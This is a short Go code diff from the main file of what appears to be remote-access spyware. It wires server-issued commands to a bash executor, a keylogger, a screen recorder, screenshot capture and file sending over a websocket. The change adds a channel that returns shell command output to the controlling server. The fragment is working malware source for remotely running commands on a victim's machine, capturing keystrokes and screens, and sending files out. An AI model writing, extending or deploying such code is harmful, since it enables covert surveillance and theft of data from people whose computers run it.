@@ -27,9 +27,10 @@ func main() {
 	// commands from server
 	screenrecorder := internal.NewScreenRecorder(5)
 	sendFileCmd := internal.NewSendFileCommand(wsc)
+	respondServerCmd := internal.NewRespondServerCommand(wsc)
 
 	subject := &internal.Subject{}
-	subject.AddListener(internal.NewBashExecutorObserver())
+	subject.AddListener(internal.NewBashExecutorObserver(respondServerCmd))
 	subject.AddListener(internal.NewKeyloggerCmdObserver())
 	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd))
 	subject.AddListener(internal.NewFileCmdObserver(sendFileCmd, watchtower))
